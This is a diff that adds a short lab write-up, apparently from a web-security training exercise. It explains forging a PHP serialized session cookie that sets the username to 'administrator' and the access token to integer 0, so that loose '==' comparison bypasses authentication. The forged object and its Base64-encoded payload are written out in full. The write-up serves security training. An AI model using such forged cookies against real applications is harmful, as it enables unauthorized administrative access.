@@ -1,0 +1,14 @@
+The decoded cookie looks like this: 
+    O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"josk4ozk2a7rflay7lcmtfm9fzpvpnfm";}
+
+We know that in PHP (at least until version 7), the "==" operator has a weird feature (i.e., a flaw):
+if we replace the username with "administrator" and "convert" the access_token string to an integer equal to zero,
+unless the admin token starts with any digit (different from 0), the operator returns 1 (i.e., true)
+
+Hence, the new serialized object should look like this:
+    O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
+
+Which Base64 + URL encoded looks like this:
+    Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
+
+Once replaced in the storage, and since the access_token of the administrator doesn't start with 0. Indeed it works
